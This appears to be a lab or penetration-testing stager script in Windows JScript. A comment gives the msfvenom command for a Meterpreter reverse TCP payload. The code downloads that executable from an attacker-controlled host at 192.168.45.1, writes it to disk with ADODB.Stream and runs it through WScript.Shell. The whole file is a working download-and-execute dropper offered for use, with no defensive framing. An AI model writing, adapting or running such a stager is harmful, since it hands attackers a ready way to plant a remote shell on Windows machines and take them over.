// GENERATE PAYLOAD WITH: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.1 LPORT=443 -o poop.exe

var url = "http://192.168.45.1/poop.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("poop.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("poop.exe");

